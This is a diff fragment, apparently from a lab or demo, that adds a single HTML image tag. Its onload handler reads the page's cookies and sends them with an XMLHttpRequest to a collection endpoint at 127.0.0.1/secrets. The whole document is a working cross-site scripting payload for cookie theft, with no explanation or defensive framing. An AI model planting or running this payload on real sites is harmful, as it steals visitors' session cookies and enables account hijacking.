@@ -1,0 +1,7 @@
+<img src="https://img.icons8.com/plasticine/2x/cookie.png" onload="javascript:
+    var url = 'http://127.0.0.1/secrets';
+    var payload = '?cookies=' + document.cookie;
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open('GET', url + payload, true);
+    xmlHttp.send();
+"/>
